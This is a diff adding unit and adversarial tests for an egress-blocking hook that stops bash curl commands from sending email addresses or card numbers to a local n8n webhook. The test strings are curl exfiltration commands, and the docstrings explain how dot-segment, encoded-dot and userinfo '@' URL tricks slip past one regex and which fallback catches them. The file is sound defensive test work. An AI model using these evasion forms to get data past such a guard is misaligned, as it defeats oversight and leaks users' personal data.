@@ -226,6 +226,72 @@ class IsBashEgressTests(unittest.TestCase):
             "curl http://localhost:5678/api/workflows/active"
         ))
 
+    def test_parent_dot_segment_localhost_5678_webhook_is_egress(self):
+        """SEPARATOR-NORM (card 8e82fb6e): `:5678/../webhook/` parent dot-segment
+        is egress. curl CLIENT-normalizes `/../` to `/` BEFORE sending (Dave
+        empirically verified `:5678/../webhook/x` actually sends `POST /webhook/x`),
+        so the bytes that leave the box hit the real n8n webhook route. The old
+        single-dot-only `/\\./` form missed it; `/\\.{1,2}/` catches it. MUST block.
+        """
+        self.assertTrue(hook._is_bash_egress(
+            "curl -X POST http://localhost:5678/../webhook/abc123 -d user@example.com"
+        ))
+
+    def test_parent_dot_segment_127_5678_webhook_is_egress(self):
+        """SEPARATOR-NORM (card 8e82fb6e): parent dot-segment on 127.0.0.1 too."""
+        self.assertTrue(hook._is_bash_egress(
+            "curl -X POST http://127.0.0.1:5678/../webhook/abc123 -d user@example.com"
+        ))
+
+    def test_parent_dot_segment_then_double_slash_5678_webhook_is_egress(self):
+        """SEPARATOR-NORM (card 8e82fb6e): `/..//webhook/` (parent dot + extra
+        slash) -- same curl-normalized family -- is egress. The `(?:...)+` repeat
+        over the separator alternation absorbs the mix."""
+        self.assertTrue(hook._is_bash_egress(
+            "curl -X POST http://localhost:5678/..//webhook/abc123 -d user@example.com"
+        ))
+
+    def test_encoded_dot_segment_5678_webhook_is_egress(self):
+        """SEPARATOR-NORM (card 8e82fb6e): url-encoded dot(s) `%2e` / `%2e%2e`
+        (encoded `/./` and `/../`) are egress -- defense-in-depth over-match,
+        same rationale as `%2f`. Bounded `(?:%2e){1,2}` -- no ReDoS."""
+        self.assertTrue(hook._is_bash_egress(
+            "curl -X POST http://127.0.0.1:5678/%2e%2e/webhook/abc123 -d user@example.com"
+        ))
+
+    def test_encoded_dot_segment_upper_single_5678_webhook_is_egress(self):
+        """SEPARATOR-NORM (card 8e82fb6e): single uppercase `%2E` encoded dot too
+        (IGNORECASE)."""
+        self.assertTrue(hook._is_bash_egress(
+            "curl -X POST http://localhost:5678/%2E/webhook/abc123 -d user@example.com"
+        ))
+
+    def test_userinfo_authority_5678_webhook_is_egress(self):
+        """@-INJECTION (card 5f70fa33): the userinfo-authority form
+        `x@localhost:5678/webhook/` moves the host anchor past the `x@` prefix, so
+        the _N8N_WEBHOOK_RX does NOT fire -- BUT the _CURL_NONLOCAL_RX fallback DOES
+        catch it (its negative-lookahead expects a bare `localhost`, and the
+        `x@localhost` form is not that bare shape), so it is covered by
+        defense-in-depth. Empirically verified: is_bash_egress == True.
+        """
+        cmd = "curl -X POST http://x@localhost:5678/webhook/exfil -d user@example.com"
+        # Documented asymmetry: n8n RX misses it, nonlocal RX catches it.
+        self.assertFalse(hook._N8N_WEBHOOK_RX.search(cmd),
+                         "n8n RX is expected NOT to fire on the userinfo form (host anchor moved)")
+        self.assertTrue(hook._CURL_NONLOCAL_RX.search(cmd),
+                        "nonlocal RX fallback MUST catch the userinfo form")
+        self.assertTrue(hook._is_bash_egress(cmd),
+                        "userinfo @-injection form must be egress via defense-in-depth")
+
+    def test_separator_class_does_not_overmatch_5678_dotdot_api(self):
+        """NEGATIVE control (card 8e82fb6e): the widened dot-segment class must NOT
+        over-fire toward a non-webhook route. `:5678/../api/status` normalizes to
+        `:5678/api/status` -- NOT the /webhook/ route -- so it stays non-egress.
+        Proves the widening didn't make every `/../` on :5678 match."""
+        self.assertFalse(hook._is_bash_egress(
+            "curl http://localhost:5678/../api/status"
+        ))
+
 
 # ---------------------------------------------------------------------------
 # Subprocess integration tests (exit codes via main())
@@ -496,6 +562,58 @@ class AdversarialTests(unittest.TestCase):
             "metadata": {"author_email": "leak@example.com"},
         }))
         self.assertEqual(r.returncode, 2)
+
+    def test_adv_n8n_webhook_parent_dot_segment_with_email_blocks(self):
+        """SEPARATOR-NORM end-to-end (card 8e82fb6e): the `/../webhook/` parent
+        dot-segment bypass carrying an email must BLOCK (exit 2). curl client-
+        normalizes `/../` to `/` before sending, so this is a REAL live egress --
+        before the widened `/\\.{1,2}/` separator it slipped the n8n RX and the
+        PII-scan never ran."""
+        r = _run(_bash(
+            "curl -X POST http://localhost:5678/../webhook/exfil "
+            "-d 'user@example.com'"
+        ))
+        self.assertEqual(r.returncode, 2, "parent dot-segment n8n webhook with email must block")
+
+    def test_adv_n8n_webhook_parent_dot_double_slash_with_email_blocks(self):
+        """SEPARATOR-NORM end-to-end (card 8e82fb6e): `/..//webhook/` (parent dot +
+        extra slash) carrying an email must BLOCK (exit 2)."""
+        r = _run(_bash(
+            "curl -X POST http://127.0.0.1:5678/..//webhook/exfil "
+            "-d 'user@example.com'"
+        ))
+        self.assertEqual(r.returncode, 2, "/..//webhook n8n with email must block")
+
+    def test_adv_n8n_webhook_encoded_dot_segment_with_card_blocks(self):
+        """SEPARATOR-NORM end-to-end (card 8e82fb6e): the `%2e%2e/webhook/`
+        encoded-dot bypass carrying a card number must BLOCK (exit 2) --
+        defense-in-depth over-match."""
+        r = _run(_bash(
+            "curl -X POST http://127.0.0.1:5678/%2e%2e/webhook/exfil "
+            "--data-raw '4111111111111111'"
+        ))
+        self.assertEqual(r.returncode, 2, "encoded-dot n8n webhook with card must block")
+
+    def test_adv_userinfo_authority_n8n_webhook_with_email_blocks(self):
+        """@-INJECTION end-to-end (card 5f70fa33): the userinfo-authority form
+        `x@localhost:5678/webhook/` carrying an email must BLOCK (exit 2) via the
+        _CURL_NONLOCAL_RX fallback (the _N8N_WEBHOOK_RX misses it because the `x@`
+        userinfo moves the host anchor, but the nonlocal RX catches it)."""
+        r = _run(_bash(
+            "curl -X POST http://x@localhost:5678/webhook/exfil "
+            "-d 'user@example.com'"
+        ))
+        self.assertEqual(r.returncode, 2, "userinfo @-injection form with email must block")
+
+    def test_adv_negative_control_dotdot_api_no_pii_not_blocked(self):
+        """NEGATIVE CONTROL (cards 8e82fb6e/5f70fa33): the widening must NOT
+        over-fire. A `:5678/../api/status` (non-webhook route) with NO PII must be
+        ALLOWED (exit 0) -- proves the widened separator class only fires toward the
+        /webhook/ route and does not blanket-match every `/../` on :5678."""
+        r = _run(_bash(
+            "curl http://localhost:5678/../api/status"
+        ))
+        self.assertEqual(r.returncode, 0, "non-webhook /../ route with no PII must be allowed")
 
 
 if __name__ == "__main__":
